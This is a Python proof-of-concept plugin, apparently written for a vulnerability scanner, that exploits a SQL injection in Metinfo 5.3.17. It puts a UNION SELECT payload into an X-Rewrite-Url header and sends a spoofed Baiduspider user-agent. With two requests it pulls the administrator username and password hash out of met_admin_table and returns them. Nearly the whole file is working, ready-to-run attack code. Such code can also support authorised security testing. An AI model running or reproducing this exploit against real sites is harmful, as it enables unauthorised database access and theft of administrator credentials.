# Author:w8ay
# Name:Metinfo 5.3.17注入漏洞
import HackRequests

def poc(arg, **kwargs):
    headers = '''
user-agent: mozilla/5.0 (compatible; baiduspider/2.0; +http://www.baidu.com/search/spider.html
X-Rewrite-Url:1/2/404xxx\' union select 1,2,3,admin_id,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met_admin_table limit 1#/index.php
    '''
    vulnurl = arg + "/index.php?lang=Cn&index=0000"
    hh = HackRequests.http(url = vulnurl,headers = headers)
    if hh.status_code != 200:
        return False
    username = getMiddle(hh.header,"list-", "-Cn")
    if username == "":
        return False
    headers = '''
user-agent: mozilla/5.0 (compatible; baiduspider/2.0; +http://www.baidu.com/search/spider.html
X-Rewrite-Url:1/2/404xxx\' union select 1,2,3,admin_pass,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from met_admin_table limit 1#/index.php
    '''
    hh = HackRequests.http(url = vulnurl,headers = headers)
    if hh.status_code != 200:
        return False
    password = getMiddle(hh.header,"list-", "-Cn")
    result = {
        "name": "metinfo 5.3.17 SQL注入",  # 插件名称
        "content": "user:{} password:{}".format(username,password),  # 插件返回内容详情，会造成什么后果。
        "url": vulnurl,  # 漏洞存在url
        "log": hh.log,
        "tag": "sqli"  # 漏洞标签
    }
    return result

def getMiddle(src,a,b):
    try:
        aa = src.index(a)
        bb = src.index(b,aa)
    except ValueError:
        return ""
    return src[aa + len(a):bb]

if __name__ == "__main__":
    data = "inf-xxxxxxxx-aa"
    print(getMiddle(data,"infa","aa"))